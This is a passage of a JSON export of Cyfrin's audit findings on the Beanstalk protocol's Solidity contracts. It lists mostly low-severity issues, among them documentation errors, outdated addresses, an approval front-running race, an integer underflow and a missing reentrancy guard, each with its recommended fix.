      "content": "The [comment](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/field/FieldFacet.sol#L131) explaining how `FundraiserFacet::fund` bypasses soil updates in the `FieldFacet::_sow` NatSpec incorrectly references `LibDibbler::sowWithMin` when this should in fact be `LibDibbler::sowNoSoil`, as below:\n\n```diff\n    /**\n     * @dev Burn Beans, Sows at the provided `_morningTemperature`, increments the total\n     * number of `beanSown`.\n     *\n     * NOTE: {FundraiserFacet} also burns Beans but bypasses the soil mechanism\n-    * by calling {LibDibbler.sowWithMin} which bypasses updates to `s.f.beanSown`\n+    * by calling {LibDibbler.sowNoSoil} which bypasses updates to `s.f.beanSown`\n     * and `s.f.soil`. This is by design, as the Fundraiser has no impact on peg\n     * maintenance and thus should not change the supply of Soil.\n     */\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31221",
      "title": "Legacy Pipeline address defined in `DepotFacet`",
      "impact": "LOW",
      "content": "Currently, `DepotFacet` references an old implementation of Pipeline with the todo comment that it should be updated:\n```solidity\naddress private constant PIPELINE =\n    0xb1bE0000bFdcDDc92A8290202830C4Ef689dCeaa; // TODO: Update with final address.\n```\nIt is understood that this todo comment has been resolved in a more recent commit and should now appear as follows:\n```diff\n- address private constant PIPELINE = 0xb1bE0000bFdcDDc92A8290202830C4Ef689dCeaa; // TODO: Update with final address.\n+ address private constant PIPELINE = 0xb1bE0000C6B3C62749b5F0c92480146452D15423;\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31220",
      "title": "Incorrect contract addresses in `C.sol`",
      "impact": "LOW",
      "content": "There are [two address constants](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/C.sol#L81-L82) in `C.sol` which have been added as part of the BEAN/ETH Well integration. Currently, `BEANSTALK_PUMP` references the crv3crypto address, defined by the [`TRI_CRYPTO`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/C.sol#L62) constant above, while `BEAN_ETH_WELL` references an address with no code. It is understood that these addresses were chosen arbitrarily for the purpose of testing until the final versions of these contracts are deployed. It is also understood that these addresses have been updated in a more recent commit with no impact on test output despite the collision with another existing address within the system.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31219",
      "title": "Use globally available Solidity variables in `C.sol`",
      "impact": "LOW",
      "content": "When specifying units of time in Solidity, literal numbers can be used with the suffixes `seconds`, `minutes`, `hours`, `days` and `weeks`. In the `C.sol` constants library, the following is recommended:\n```diff\n- uint256 private constant CURRENT_SEASON_PERIOD = 3600;\n+ uint256 private constant CURRENT_SEASON_PERIOD = 1 hours;\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31218",
      "title": "Duplicated update logic to an account's `lastUpdate` in `LibSilo::_mow` can be simplified",
      "impact": "LOW",
      "content": "Currently, the update to an account's `lastUpdate` in `LibSilo::_mow` occurs twice – both [after handling Flood logic](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibSilo.sol#L362) and then again at the [end of the function](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibSilo.sol#L372). It appears that this second instance was added as mitigation against a [different issue](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibSilo.sol#L370-L371); however, it has the implication that the first instance is no longer needed as the second will always be reached in the case of successful execution, and none of the remaining logic depends on the value of the account's `lastUpdate`.\n\nAdditionally, the [comment](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibSilo.sol#L360-L361) preceding the first update is irrelevant here as the case it describes is [handled by `LibSilo::__mow`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibSilo.sol#L391-L393) – if the last stem equals the current stem tip then execution ends, and no additional grown stalk can be claimed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31217",
      "title": "Additional documentation should be added regarding the correct use of `pricingFunction` for v2 Pod listings",
      "impact": "LOW",
      "content": "When creating a v2 Pod listing, users are required to pass a [pricing function](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/Listing.sol#L91) that will determine the price per Pod depending on the Plot index plus the starting position of Pods inside the Plot and the historical account of harvestable Pods. The difference between these two values yields the [`placeInLine`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/Order.sol#L133) parameter of `Order::_fillPodOrderV2`, which is in units of Pods/Beans and thus has six decimals of precision.\n\n[`LibPolynomial::evaluatePolynomialPiecewise`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibPolynomial.sol#L85-L94) evaluates the price per Pod by considering that its parameter `x`, which corresponds to `placeInLine`, has no fixed-point decimals and then executes a third-degree polynomial function depending on the user-supplied `pricingFunction`.\n\nIf `x` is considered to have no decimals, then there arises a problem with $placeInLine^{n}$ if $n \\neq 1$ given that the number of decimals for each term would increase to $(n -1) \\times 6$. This error must, therefore, be handled by the `pricingFunction` bytes, which can be divided into five constituent parameters:\n* n (32 bytes): Corresponds to the number of pieces to consider. Each piece consists of a third-degree polynomial.\n* breakpoint (32n bytes): `x` values where evaluation changes from one piece to another. There is one breakpoint per piece.\n* significands (128n bytes): 4 per piece, ordered from most to least significant term.\n* exponents (128n bytes): 4 per piece, ordered from the most to least significant term.\n* signs (4n bytes): 4 per piece, indicating the term sign of each piece, ordered from the most to least significant term.\n\nTaking note of the example provided in the [comments of `LibPolynomial`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibPolynomial.sol#L21-L45), it can be observed that `x` was intended not to have any additional fixed-point decimals. However, this can be handled through `pricingFunction` with the consideration that the exponents should be defined as follows:\n1. The exponent corresponding to the cubic term should be 12 plus the significand decimals. Given that $x$ has 6 decimals, then $x^{3}$ will have 18 decimals. Division by $1 \\times 10^{12}$ is necessary to keep the value consistent with the target precision.\n2. The exponent corresponding second-degree term should be 6 plus the significand decimals. Given that $x$ has 6 decimals, then $x^{2}$ will have 12 decimals. Division by $1 \\times 10^{6}$ is necessary to keep the value consistent with the target precision.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31216",
      "title": "Potential DoS in `FertilizerFacet::getFertilizers` if enough Fertilizer is added",
      "impact": "LOW",
      "content": "It is possible that [`FertilizerFacet::getFertilizers`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/barn/FertilizerFacet.sol#L172-L192) can be susceptible to DoS if enough Fertilizer NFTs are minted, given that it attempts to query all the nodes of a linked list in two separate while loops. This function is not used anywhere else within the protocol and appears for UI/UX purposes only, but any potential third-party integrations should consider this issue carefully.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31215",
      "title": "Unused events in `WhitelistFacet` can be removed",
      "impact": "LOW",
      "content": "The [`WhitelistToken`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/WhitelistFacet.sol#L20-L32), [`UpdatedStalkPerBdvPerSeason`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/WhitelistFacet.sol#L34-L44), and [`DewhitelistToken`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/WhitelistFacet.sol#L46-L50) events in `WhitelistFacet` are not currently used. Moreover, the [same events](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibWhitelist.sol#L19-L55) are already declared in `LibWhitelist` where they are used.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31214",
      "title": "Constant block time assumption could be invalidated, affecting calculation of `SeasonFacet::gm` incentives",
      "impact": "LOW",
      "content": "The block time of Ethereum, despite having never been constant, always has a target time toward which blocks are added. On occasion, this value has changed. Initially, in PoW Ethereum, the block time target was approximately 13-14 seconds, but with the PoS Merge in 2022 this [changed](https://ycharts.com/indicators/ethereum_average_block_time) to 12 seconds. This means that any [assumption](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/C.sol#L28) of a constant average block time could be invalidated. Therefore, the blocks late [calculation](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/SeasonFacet.sol#L136-L141) within the call to [`SeasonFacet::incentivize`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/SeasonFacet.sol#L61) would be incorrect if, in future, the target block time changes, affecting the [expected Bean rewards](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibIncentive.sol#L65-L107).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31213",
      "title": "The names of numerous state variables should be changed to more verbose alternatives",
      "impact": "LOW",
      "content": "Currently, it can be confusing when referencing values in storage as it is difficult to make sense of incredibly short attribute names. The following instances have been identified, along with more verbose alternatives:\n\n* `Account::State`:\n    * `Silo s` -> `Silo silo`.\n* `Storage::Weather`:\n    * `uint32 t` -> `uint32 temperature`.\n* `Storage::AppStorage`:\n    * `mapping (address => Account.State) a` -> `mapping (address => Account.State) account`.\n    * `Storage.Contracts c` -> `Storage.Contracts contract`.\n    * `Storage.Field f` -> `Storage.Field field`.\n    * `Storage.Governance g` -> `Storage.Governance governance`.\n    * `CurveMetapoolOracle co` -> `CurveMetapoolOracle curveOracle`.\n    * `Storage.Rain r` -> `Storage.Rain rain`.\n    * `Storage.Silo s` -> `Storage.Silo silo`.\n    * `Storage.Weather w` to `Storage.Weather weather`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31212",
      "title": "Spender can front-run calls to modify token allowances, resulting in DoS and/or spending more than was intended",
      "impact": "LOW",
      "content": "**Description:** When updating the allowance for a spender that is less than the value currently set, a well-known race condition allows the spender to spend more than the caller intended by front-running the transaction that performs this update. Due to the nature of the `ERC20::approve` implementation and [other](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/ApprovalFacet.sol#L46-L54) [variants](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/TokenFacet.sol#L104-L110) [used](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/MarketplaceFacet.sol#L244-L252) within the Beanstalk system, which update the mapping in storage corresponding to the given allowance, the spender can spend both the existing allowance plus any 'additional' allowance set by the in-flight transaction.\n\nFor example, consider the scenario:\n* Alice approves Bob 100 tokens.\n* Alice later decides to decrease this to 50.\n* Bob sees this transaction in the mempool and front-runs, spending his 100 token allowance.\n* Alice's transaction executes, and Bob's allowance is updated to 50.\n* Bob can now spend an additional 50 tokens, resulting in a total of 150 rather than the maximum of 50 as intended by Alice.\n\nSpecific functions named `decreaseTokenAllowance`, intended to decrease approvals for a token spender, have been introduced to both the [`TokenFacet`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/TokenFacet.sol#L133-L154) and the [`ApprovalFacet`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/ApprovalFacet.sol#L84-L93). [`PodTransfer::decrementAllowancePods`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/PodTransfer.sol#L87-L98) similarly exists for the Pod Marketplace.\n\nThe issue, however, with these functions is that they are still susceptible to front-running in the sense that a malicious spender could force their execution to revert, violating the intention of the caller to decrease their allowance as they continue to spend that which is currently set. Rather than simply setting the allowance to zero if the caller passes an amount to subtract that is larger than the current allowance, these functions halt execution and revert. This is due to the following line of shared logic:\n\n```solidity\nrequire(\n    currentAllowance >= subtractedValue,\n    \"Silo: decreased allowance below zero\"\n);\n```\n\nConsider the following scenario:\n* Alice approves Bob 100 tokens.\n* Alice later decides to decrease this to 50.\n* Bob sees this transaction in the mempool and front-runs, spending 60 of his 100 token allowance.\n* Alice's transaction executes, but reverts given Bob's allowance is now 40.\n* Bob can now spend the remaining 40 tokens, resulting in a total of 100 rather than the decreased amount of 50 as intended by Alice.\n\nOf course, in this scenario, Bob could have just as easily front-run Alice's transaction and spent his entire existing allowance; however, the fact that he is able to perform a denial-of-service attack results in a degraded user experience. Similar to setting maximum approvals, these functions should handle maximum approval revocations to mitigate against this issue.\n\n**Impact:** Requiring that the intended subtracted allowance does not exceed the current allowance results in a degraded user experience and, more significantly, their loss of funds due to a different route to the same approval front-running attack vector.\n\n**Recommended Mitigation:** Set the allowance to zero if the intended subtracted value exceeds the current allowance.\n\n\\clearpage",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31211",
      "title": "Incorrect formatting of `MetadataFacet::uri` JSON results in broken metadata which cannot be displayed by external clients",
      "impact": "LOW",
      "content": "**Description:** For fully on-chain metadata, external clients expect the URI of a token to contain a base64 encoded JSON object that contains the metadata and base64 encoded SVG image. Currently, [`MetadataFacet::uri`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/metadata/MetadataFacet.sol#L30-L51) is missing multiple quotations and commas within the encoded string which breaks its JSON formatting.\n\n**Impact:** External clients such as OpenSea are currently unable to display Beanstalk token metadata due to broken JSON formatting.\n\n**Recommended Mitigation:** Add missing quotation marks and commas. Ensure the resulting encoded bytes are that of valid JSON.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31210",
      "title": "Unchecked decrement results in integer underflow in `LibStrings::toString`",
      "impact": "LOW",
      "content": "**Description:** The implementation of [`LibStrings::toString`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibStrings.sol#L16-L37) is intended to convert an unsigned integer to its string representation. If the value provided is non-zero, the function determines the number of digits in the number, creates a byte buffer of the appropriate size, and then populates that buffer with the ASCII representation of each digit. However, given Beanstalk uses a Solidity compiler version lower than `0.8.0` in which safe, checked math was introduced as default, this library is susceptible to over/underflow of unchecked math operations. One such issue arises when [post-decrementing the `index`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibStrings.sol#L33), initialized as [`digits - 1`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibStrings.sol#L30), which underflows on the final loop iteration.\n\n\n**Impact:** Evidence of underflow is visible in the use of this function on-chain in both `MetadataFacet::uri`:\n\n![URI](img/uri.png)\n\nand `MetadataImage::imageURI`:\n\n![Image](img/overlap.png)\n\nThe \"Deposit stem\" [attribute](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/metadata/MetadataFacet.sol#L37) is incredibly large due to wrap-around of the maximum `uint256` value, and the same issue applies to [`MetadataImage::blackBars`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/metadata/MetadataImage.sol#L528) called within [`MetadataImage::generateImage](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/metadata/MetadataImage.sol#L35-L49) which causes the stem string representation to overlap with the [\"Bean Deposit\" text](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/metadata/MetadataImage.sol#L538-L539).\n\nThis issue should be resolved to display accurate metadata, given the following disclaimer in `MetadataFacet::uri`:\n> DISCLAIMER: Due diligence is imperative when assessing this NFT. Opensea and other NFT marketplaces cache the svg output and thus, may require the user to refresh the metadata to properly show the correct values.\"\n\n**Recommended Mitigation:** Initialize `index` to `digits` and pre-decrement instead to avoid underflow on the final loop iteration.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31209",
      "title": "Creation of a new Pod order in place of an existing order requires excess Beans",
      "impact": "LOW",
      "content": "When creating a new Pod order, a user needs to send the Beans required to fulfill the order. If an order already exists with the same sender, `pricePerPod`, `maxPlaceInLine`, and `minFillAmount`, this order must first be canceled, which implies a refund of the previously sent Beans.\n\nOne issue with this workflow, which applies to both [v1](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/Order.sol#L62-L68) and [v2](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/Order.sol#L80-L83) orders, is that if the user overrides an existing order, they must send additional Beans because those for the previous order are not considered. Instead, it would make more sense to first cancel the existing order, then try to fulfill the Bean requirement with that of the canceled order, and only if this is not sufficient require the caller send additional Beans.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31208",
      "title": "`Listing::getAmountPodsFromFillListing` underflow can lead to undesired behaviour of `Listing::_fillListing`",
      "impact": "LOW",
      "content": "If [`fillBeanAmount * 1_000_000 > type(uint256).max`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/Listing.sol#L144), the output of [`Listing::getAmountPodsFromFillListing`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/Listing.sol#L144) would be less than expected, which can lead to the loss of user funds through `Listing::_fillListing`. However, the conditions for this issue to arise are highly unlikely given that `MarketplaceFacet::fillPodListing` is the only function that makes use of this function, and which previously performs a [Bean transfer](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/MarketplaceFacet.sol#L70) of `fillBeanAmount`.  The large number of tokens required to produce the undesired behavior notwithstanding, considering the economic impact, use of `SafeMath` when performing the quoted operation should be considered here.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31207",
      "title": "When a Pod order is partially filled, the remaining amount pending to fill may not be able to be filled",
      "impact": "LOW",
      "content": "Whenever a Pod order is partially filled, the remaining amount to fill cannot be filled if it is less than the `minFillAmount` set when the order was created. This current behavior forces the creator of the Pod order to cancel the Pod listing, creating a new one with a new `minFillAmount` and applies to both [v1](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/Listing.sol#L191-L200) and [v2](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/Listing.sol#L217-L227) listings.\n\nDepending on the desired behavior:\n1. The `minFillAmount` can be decreased to a value lower than/equal to the amount pending to fill.\n2. The Pod listing for the remaining amount to fill can be canceled.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31206",
      "title": "Missing reentrancy guard in `TokenFacet::transferToken`",
      "impact": "LOW",
      "content": "Unlike most other external and potentially state-modifying functions in `TokenFacet`, [`TokenFacet::transferToken`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/TokenFacet.sol#L56-L62) does not have the `nonReentrant` modifier applied. While we have been unable to identify a vector for exploit based on the current commit hash, it is recommended to add the modifier to this function to be in keeping with the rest of the code and prevent any potential future misuse.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31205",
      "title": "Missing allowance in `CurveFacet`",
      "impact": "LOW",
      "content": "**Description:** When liquidity is added to a Curve pool via `CurveFacet::addLiquidity`, the Beanstalk Diamond first [receives tokens](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/CurveFacet.sol#L112-L116) from the caller and then [sets approvals](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/CurveFacet.sol#L117) to allow the pool to pull these tokens via `ERC20::transferFrom`. Currently, in `CurveFacet::removeLiquidity`, there is no logic for setting allowances on LP tokens before [calling the pool `remove_liquidity` function](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/CurveFacet.sol#L180-L183) as typically the pool and LP token addresses are the same, which means that the relevant burn function can be called internally; however, some pools such as 3CRV and Tri-Crypto (which are already handled differently within a [conditional block](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/CurveFacet.sol#L175)) require an allowance to call `ERC20::burnFrom` given that the pool and LP token addresses differ in these cases.\n\n**Impact:** Callers of the `CurveFacet` may be unable to remove liquidity from the 3CRV and Tri-Crypto pools via Beanstalk.\n\n**Recommended Mitigation:** Unless an infinite approval is already set by the Beanstalk Diamond on these pools, which does not appear to be the case and in any case is not recommended, logic to approve the corresponding pools for these LP tokens should be added to `CurveFacet::removeLiquidity` before the actual call to remove liquidity.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31204",
      "title": "Silent failure can occur in `Pipeline` function calls if the target has no code",
      "impact": "LOW",
